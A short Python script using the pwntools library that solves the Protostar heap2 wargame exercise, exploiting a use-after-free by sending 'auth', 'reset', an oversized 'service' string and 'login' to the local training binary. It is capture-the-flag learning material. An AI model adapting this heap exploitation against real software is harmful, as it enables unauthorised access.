# coding: ascii
# https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

from pwn import *

# context.update(arch='x86', os='linux')

p = process("./protostar-heap2")
print(p.recv())
# print(p.readline())
p.sendline(b"auth thing")

print(p.readline())

p.sendline(b"reset")

print(p.readline())

p.sendline(b"service " + b"0"*0x20)

print(p.readline())

p.sendline(b"login")

print(p.readline())